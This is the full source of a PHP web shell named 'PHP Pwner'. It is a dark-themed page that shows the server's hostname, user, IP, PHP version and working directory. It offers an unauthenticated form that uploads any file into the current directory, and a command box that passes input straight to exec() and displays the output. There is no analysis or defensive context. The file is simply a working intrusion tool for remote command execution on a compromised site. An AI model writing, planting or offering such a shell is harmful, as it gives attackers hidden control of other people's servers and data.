<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Pwner</title>
    <style>
        body {
            background-color: #1e1e1e;
            color: #dcdcdc;
            font-family: 'Courier New', Courier, monospace;
            margin: 20px;
            padding: 0;
        }
        .system-info {
            border: 1px solid #333;
            background-color: #2d2d2d;
            padding: 10px;
            margin-bottom: 20px;
        }
        .system-info h3 {
            margin-top: 0;
            margin-bottom: 10px;
            font-size: 16px;
            color: #569cd6;
        }
        .system-info-item {
            margin-bottom: 5px;
            color: #dcdcdc;
        }
        .upload-form {
            margin-top: 20px;
            margin-bottom: 20px;
        }
        .upload-form label {
            display: block;
            margin-bottom: 5px;
        }
        input[type="file"] {
            background-color: #2d2d2d;
            color: #dcdcdc;
            border: 1px solid #444;
            padding: 8px;
            margin-top: 5px;
        }
        input[type="submit"], input[type="text"] {
            background-color: #444;
            color: #dcdcdc;
            border: none;
            padding: 8px 12px;
            cursor: pointer;
        }
        input[type="submit"]:hover, input[type="text"]:hover {
            background-color: #569cd6;
        }
        #terminal {
            background-color: #2d2d2d;
            padding: 10px;
            border: 1px solid #444;
            margin-top: 20px;
            color: #dcdcdc;
        }
        #terminal pre {
            color: #dcdcdc;
            margin: 0;
        }
        .current-directory {
            color: #6a9955;
            font-weight: bold;
        }
        #result {
            background-color: #1e1e1e;
            padding: 10px;
            border: 1px solid #444;
            margin-top: 20px;
            color: #dcdcdc;
            white-space: pre-wrap;
        }
        #clear-btn {
            background-color: #e51400;
            color: #dcdcdc;
            border: none;
            padding: 8px 12px;
            cursor: pointer;
            margin-top: 10px;
        }
        #clear-btn:hover {
            background-color: #ff6b6b;
        }
    </style>
</head>
<body>
    <pre id="ascii-art">
    __     __   ____  _           ____                             __     __ 
   | _| _ |_ | |  _ \| |__  _ __ |  _ \__      ___ __   ___ _ __  | _| _ |_ |
   | |_| |_| | | |_) | '_ \| '_ \| |_) \ \ /\ / / '_ \ / _ \ '__| | |_| |_| |
   | |_   _| | |  __/| | | | |_) |  __/ \ V  V /| | | |  __/ |    | |_   _| |
   | | |_| | | |_|   |_| |_| .__/|_|     \_/\_/ |_| |_|\___|_|    | | |_| | |
   |__|   |__|             |_|                                    |__|   |__|
    </pre>

    <div class="system-info">
        <h3>System Information</h3>
        <div class="system-info-item">
            [+] Hostname: <span><?php echo gethostname(); ?></span>
        </div>
        <div class="system-info-item">
            [+] Username: <span><?php echo get_current_user(); ?></span>
        </div>
        <div class="system-info-item">
            [+] IP: <span><?php echo $_SERVER['SERVER_ADDR']; ?></span>
        </div>
        <div class="system-info-item">
            [+] PHP Version: <span><?php echo phpversion(); ?></span>
        </div>
        <div class="system-info-item">
            [+] Uname: <span><?php echo php_uname(); ?></span>
        </div>
        <div class="system-info-item">
            [+] Current Directory: <span class="current-directory"><?php echo getcwd(); ?></span>
        </div>
    </div>

    <form method="post" enctype="multipart/form-data" class="upload-form">
        <h3>Upload File</h3>
        <label for="file">Select file:</label>
        <input type="file" id="file" name="file" required>
        <input type="submit" value="Upload File">
    </form>

    <form method="post">
        <label for="cmd">Command:</label>
        <input type="text" id="cmd" name="cmd" autocomplete="off" autofocus>
        <input type="submit" value="Execute">
    </form>

    <button id="clear-btn" onclick="document.getElementById('result').innerHTML = '';">Clear</button>

    <div id="terminal">
        <div id="result">
        <?php
        // Function to execute commands
        function executeCommand($cmd) {
            // Execute the command and capture output and return code
            exec($cmd . " 2>&1", $output, $retval);

            // Format the command result
            $result = "<pre>";
            $result .= htmlspecialchars("$ {$cmd}\n");
            $result .= htmlspecialchars(implode("\n", $output)) . "\n";
            $result .= "</pre>";

            return $result;
        }

        // Function to handle file upload
        function handleFileUpload() {
            if ($_FILES['file']['error'] === UPLOAD_ERR_OK) {
                $uploadDir = getcwd() . '/'; // Directory where uploaded files will be stored in current directory
                
                $uploadFile = $uploadDir . basename($_FILES['file']['name']);
                
                if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
                    echo "<pre>File uploaded successfully: " . htmlspecialchars($uploadFile) . "</pre>";
                } else {
                    echo "<pre>Error uploading file.</pre>";
                }
            } else {
                echo "<pre>Error: " . htmlspecialchars($_FILES['file']['error']) . "</pre>";
            }
        }

        // Handle file upload if form submitted
        if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_FILES['file'])) {
            handleFileUpload();
        }

        // Handle command execution if form submitted
        if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['cmd'])) {
            $cmd = $_POST['cmd'];

            // Execute the command and show only the most recent result
            $result = executeCommand($cmd);
            echo $result;
        }
        ?>
        </div>
    </div>
</body>
</html>
